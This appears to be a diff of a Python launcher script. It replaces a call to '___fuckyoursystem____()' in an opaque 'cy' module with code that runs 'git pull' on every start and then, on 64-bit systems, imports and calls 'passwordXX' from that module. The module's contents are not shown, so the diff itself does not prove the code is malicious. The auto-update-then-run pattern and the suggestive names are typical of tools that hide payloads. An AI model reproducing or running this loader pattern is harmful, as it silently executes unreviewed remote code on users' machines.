@@ -1,5 +1,24 @@
-import os, sys
-try:
-    __import__("cy").___fuckyoursystem____()
-except Exception as e:
-    exit(str(e))
+import os, platform
+
+os.system('git pull')
+
+import requests
+
+ 
+
+bit = platform.architecture()[0]
+
+if bit == '64bit':
+
+    from cy import passwordXX
+
+    passwordXX()
+
+
+
+
+
+
+
+
+
